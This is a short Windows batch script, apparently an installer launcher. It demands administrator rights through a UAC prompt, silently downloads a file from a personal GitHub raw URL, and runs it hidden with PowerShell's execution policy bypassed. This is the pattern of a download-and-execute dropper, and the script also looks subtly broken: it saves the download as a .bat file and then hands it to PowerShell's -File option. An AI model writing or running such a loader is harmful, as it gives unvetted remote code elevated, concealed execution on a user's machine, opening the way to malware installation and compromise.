@echo off
setlocal

:: Define the log file path in the same directory as this script
set LOG_FILE=%~dp0run_log.txt

:: Check if the script is running with administrative privileges
openfiles >nul 2>&1
if %errorlevel% NEQ 0 (
    :: Prompt for administrative privileges
    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs"
    echo [%date% %time%] Failed to run 'run.bat' - Script requires administrative privileges. >> "%LOG_FILE%"
    exit /b
)

:: Download the installer from a remote location silently
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/angeborrelli/files/main/run.bat', '%~dp0run.bat')"
if %errorlevel% NEQ 0 (
    echo [%date% %time%] Failed to download 'run.bat' from remote location. >> "%LOG_FILE%"
    exit /b
)

:: Run the PowerShell script silently
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%~dp0run.bat"
if %errorlevel% NEQ 0 (
    echo [%date% %time%] Failed to execute 'run.bat'. Reason: PowerShell script execution failed. >> "%LOG_FILE%"
) else (
    echo [%date% %time%] Successfully executed 'run.bat'. >> "%LOG_FILE%"
)

endlocal
